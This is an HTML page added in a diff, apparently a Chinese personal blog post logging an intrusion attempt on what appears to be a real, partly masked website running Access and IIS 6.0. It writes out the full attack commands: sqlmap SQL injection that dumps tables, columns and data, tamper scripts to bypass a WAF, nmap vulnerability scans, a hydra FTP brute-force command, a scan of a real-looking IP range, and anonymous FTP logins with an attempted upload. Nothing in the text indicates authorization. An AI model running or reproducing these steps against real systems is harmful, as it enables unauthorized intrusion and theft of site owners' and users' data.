@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2016.1209Access数据库实践</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">2016.1209Access数据库实践</h1>
+        <div class="show-content">
+          <p>用google语法，找到一个注入点。用ｓｑｌｍａｐ检测一下。</p><p>sqlmap显示，在access数据库中，列举数据库名称是不可能的，让我们直接列举表名。</p><p>真的等了有蛮久。。是穷举吗，最后得出了数据库名称，和表名。</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-2c749a42f54591e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-2c749a42f54591e0.png?imageMogr2/auto-orient/strip" data-image-slug="2c749a42f54591e0" data-width="359" data-height="183"><br><div class="image-caption"></div>
+</div><p>接下来列名。</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-0f07866c9cb050ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-0f07866c9cb050ca.png?imageMogr2/auto-orient/strip" data-image-slug="0f07866c9cb050ca" data-width="350" data-height="228"><br><div class="image-caption"></div>
+</div><hr><p>以及列名中的数据。</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-63a6f0a0dcaf9cac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-63a6f0a0dcaf9cac.png?imageMogr2/auto-orient/strip" data-image-slug="63a6f0a0dcaf9cac" data-width="367" data-height="133"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-82fb44d4ef2b7e3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-82fb44d4ef2b7e3a.png?imageMogr2/auto-orient/strip" data-image-slug="82fb44d4ef2b7e3a" data-width="415" data-height="133"><br><div class="image-caption"></div>
+</div><p>没找到后台。</p><hr><p>2017.10.22 更新</p><p>进行信息收集。在网页后方加 /foot.asp   了解该网页制作时间是七八年前。</p><p>/uploadfile   403禁止访问，看来基本的安全措施是做了的</p><blockquote>
+<p>Directory Listing Denied</p>
+<p>This Virtual Directory does not allow contents to be listed.</p>
+</blockquote><p>操作系统：Microsoft Windows 2003|XP (92%)</p><p>开放端口：21（ftp）、80（http）</p><p>开放具体服务版本：</p><blockquote>
+<p>nmap　域名　-sV -p 21,80</p>
+<p>21/tcp open  ftp     Microsoft ftpd</p>
+<p>80/tcp open  http    Microsoft IIS httpd 6.0</p>
+</blockquote><p>nmap --script=vuln www.域名马赛克.org</p><blockquote>
+<p> http-csrf:</p>
+<p>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=域名马赛克</p>
+<p>|   Found the following <b>possible CSRF vulnerabilities: </b></p>
+<p>|     Path: http://www.域名马赛克/ly.asp</p>
+<p>|     Form id:</p>
+<p>|_    Form action: messageok.asp?actopt=add</p>
+<p>|_http-dombased-xss: Couldn't find any DOM based XSS.</p>
+</blockquote><p>whatweb -v　域名</p><p>没有探测到什么特别的信息，结果基本符合上面探测的内容。</p><hr><p>sqlmap -u "http://www.xxx.org/yyjshow.asp?id=1429&amp;ctype=ÒôÀÖ¼¾" --dbms "Microsoft Access" --level 3</p><p>再次注入，发现该网站加了一个ｗａｆ。。。虽然可以用ｓｑｌｍａｐ绕过，但是请求过多就会拒绝连接。于是。。。</p><p>sqlmap -u "http://www.xxxxx.org/yyjshow.asp?id=1429&amp;ctype=ÒôÀÖ¼¾" --dbms "Microsoft Access" --level 3 --tamper charunicodeencode.py space2comment.py --tables</p><blockquote>
+<p>[22:14:40] [ERROR] <b>cannot retrieve table names</b>, back-end DBMS is Access</p>
+<p>do you want to use common table existence check? [Y/n/q] y</p>
+<p>这种枚举方式有３０００多个表，而且连接经常断掉，所以暂时放弃。</p>
+<p>获得一个存在的表　user</p>
+</blockquote><p>ftp爆破：hydra ip ftp -L 用户名.txt -P 密码.txt -t 线程(默认16) -vV</p><p>检查Ｃ段</p><p>nmap -sV 61.155.154.* -oX myscan.xml</p><p>全部是在线的，而且都是ｗｉｎｄｏｗｓ，开端口21、80.</p><p><a href="https://www.jianshu.com/p/3bc51d1eb6dc" target="_blank">ftp匿名登录扫描</a>，扫到了２个。。真是好运气</p><p>xx.xx.xx.xx:     21 - Anonymous READ (220-Microsoft FTP Service 220)</p><blockquote>
+<p>ftp  xxx.xxx.xx.xx</p>
+<p>anonymous</p>
+<p>ls</p>
+<p>put /root/Desktop/xx.py</p>
+</blockquote><p>两个ｆｔｐ服务器上，没发现任何文件，而且没有写权限。</p><p>啊啊～溢出溢出不会。</p><p>待续</p>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
